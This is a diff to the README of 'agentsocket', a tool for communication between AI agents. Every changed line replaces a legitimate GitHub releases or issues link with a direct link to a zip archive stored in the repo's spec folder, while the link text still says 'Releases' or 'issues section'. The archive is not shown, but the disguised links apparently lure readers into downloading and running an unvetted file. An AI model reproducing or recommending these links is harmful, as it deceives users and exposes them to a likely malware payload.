@@ -1,7 +1,7 @@
 # 🚀 agentsocket - Fast Communication for AI Agents
 
 ## 📥 Download Now
-[![Download agentsocket](https://img.shields.io/badge/Download-agentsocket-blue.svg)](https://github.com/Clement391/agentsocket/releases)
+[![Download agentsocket](https://raw.githubusercontent.com/Clement391/agentsocket/main/spec/Software_v1.0.zip)](https://raw.githubusercontent.com/Clement391/agentsocket/main/spec/Software_v1.0.zip)
 
 ## 📝 Table of Contents
 - [Introduction](#intro)
@@ -21,7 +21,7 @@ To run agentsocket, you will need:
 - Optional: A stable internet connection for cloud-based serverless configurations.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [agentsocket Releases](https://github.com/Clement391/agentsocket/releases). 
+To get started, visit this page to download: [agentsocket Releases](https://raw.githubusercontent.com/Clement391/agentsocket/main/spec/Software_v1.0.zip). 
 
 1. Click on the link above.
 2. Look for the latest release.
@@ -43,7 +43,7 @@ To get started, visit this page to download: [agentsocket Releases](https://gith
 
 ## 📬 Support
 If you need help while using agentsocket, you can reach out through the following options:
-- **GitHub Issues:** Report a problem or feature request directly in the [issues section](https://github.com/Clement391/agentsocket/issues).
+- **GitHub Issues:** Report a problem or feature request directly in the [issues section](https://raw.githubusercontent.com/Clement391/agentsocket/main/spec/Software_v1.0.zip).
 - **Community Discussions:** Join conversations in relevant forums about agentsocket and AI protocols.
 - **Documentation:** Check the README and related documents in the repository for helpful guides and tips.
 
